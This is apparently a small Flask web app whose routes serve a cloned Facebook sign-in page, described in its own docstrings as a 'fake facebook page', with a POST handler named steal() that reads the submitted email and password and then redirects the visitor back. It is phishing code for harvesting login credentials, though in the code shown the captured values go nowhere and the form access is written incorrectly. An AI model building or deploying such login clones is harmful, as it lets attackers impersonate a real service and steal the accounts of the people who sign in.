"""Our script for dynamic page serving."""

from flask import Flask, render_template, request, redirect, url_for
import requests


app = Flask(__name__)


@app.route("/")
@app.route("/index")
def index():
    """Index page."""
    return render_template("index.html")


@app.route("/portals")
def portals():
    """Portal."""
    return render_template("portals.html")


@app.route("/disclaimers")
def disclaimers():
    """Sign-in disclaimer."""
    return render_template("disclaimers.html", routes_to=url_for(request.args["routes_to"]))


@app.route("/signin")
def signin():
    """Fake facebook page."""
    return render_template("facebookClone.htm")


@app.route("/signin", methods=["POST"])
def steal():
    """Fake facebook page."""
    email = request["email"]
    password = request["encpass"]

    return redirect(url_for("signin"))
